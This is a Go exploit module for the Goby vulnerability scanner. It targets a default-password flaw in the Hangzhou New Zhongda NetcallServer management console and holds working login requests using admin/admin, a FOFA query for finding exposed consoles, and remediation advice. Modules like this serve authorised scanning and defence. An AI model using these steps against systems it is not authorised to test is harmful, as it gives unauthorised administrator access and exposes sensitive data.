package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Hangzhou new Zhongda NetcallServer management console default password",
    "Description": "<p>Hangzhou New Zhongda NetcallServer Management console is an instant messaging software of Hangzhou New Zhongda Technology Co., LTD. There is a default password in the NetcallServer management console of Hangzhou New CUHK, which can be exploited by attackers to obtain sensitive information.</p>",
    "Product": "NEWGRAND-NETCALL",
    "Homepage": "http://www.newgrand.cn/",
    "DisclosureDate": "2022-12-15",
    "Author": "afei_00123@foxmail.com",
    "FofaQuery": "title==\"netcallServer 管理控制台\"",
    "GobyQuery": "title==\"netcallServer 管理控制台\"",
    "Level": "2",
    "Impact": "<p>The attacker can control the whole platform through the default password vulnerability and operate the core functions with the administrator rights. Cause sensitive information to leak.</p>",
    "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.</p><p>2. If not necessary, prohibit public network access to the system.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
    "References": [
        "https://fofa.info/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "JSESSIONID|lastheader|regex|Set-Cookie: (.*);"
            ]
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/login.jsp",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Connection": "close",
                    "Cookie": "{{{JSESSIONID}}}"
                },
                "data_type": "text",
                "data": "url=%2Findex.jsp&login=true&username=admin&password=admin"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "system-clustering.jsp",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "server-properties.jsp",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "JSESSIONID|lastheader|regex|Set-Cookie: (.*);"
            ]
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/login.jsp",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Connection": "close",
                    "Cookie": "{{{JSESSIONID}}}"
                },
                "data_type": "text",
                "data": "url=%2Findex.jsp&login=true&username=admin&password=admin"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "system-clustering.jsp",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "server-properties.jsp",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|define|text|admin:admin"
            ]
        }
    ],
    "Tags": [
        "Default Password"
    ],
    "VulType": [
        "Default Password"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        "CNVD-2021-23579"
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "杭州新中大 NetcallServer 管理控制台默认口令",
            "Product": "NEWGRAND-NETCALL",
            "Description": "<p>杭州新中大NetcallServer管理控制台是杭州新中大科技股份有限公司的一款即时通讯软件。杭州新中大NetcallServer管理控制台存在默认口令，攻击者可利用该漏洞获取敏感信息。</p>",
            "Recommendation": "<p>1、修改默认口令，密码最好包含大小写字母、数字和特殊字符等，且位数大于8位。</p><p>2、如非必要，禁止公网访问该系统。</p><p>3、通过防火墙等安全设备设置访问策略，设置白名单访问。</p>",
            "Impact": "<p>攻击者可通过默认口令漏洞控制整个平台，使用管理员权限操作核心的功能。造成敏感信息泄露。<br></p>",
            "VulType": [
                "默认口令"
            ],
            "Tags": [
                "默认口令"
            ]
        },
        "EN": {
            "Name": "Hangzhou new Zhongda NetcallServer management console default password",
            "Product": "NEWGRAND-NETCALL",
            "Description": "<p>Hangzhou New Zhongda NetcallServer Management console is an instant messaging software of Hangzhou New Zhongda Technology Co., LTD. There is a default password in the NetcallServer management console of Hangzhou New CUHK, which can be exploited by attackers to obtain sensitive information.<br></p>",
            "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.</p><p>2. If not necessary, prohibit public network access to the system.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
            "Impact": "<p><span style=\"font-size: var(--main-font-size);\">The attacker can control the whole platform through the default password vulnerability and operate the core functions with the administrator rights.</span><span style=\"font-size: var(--main-font-size);\"> Cause sensitive information to leak.</span></p>",
            "VulType": [
                "Default Password"
            ],
            "Tags": [
                "Default Password"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10786"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}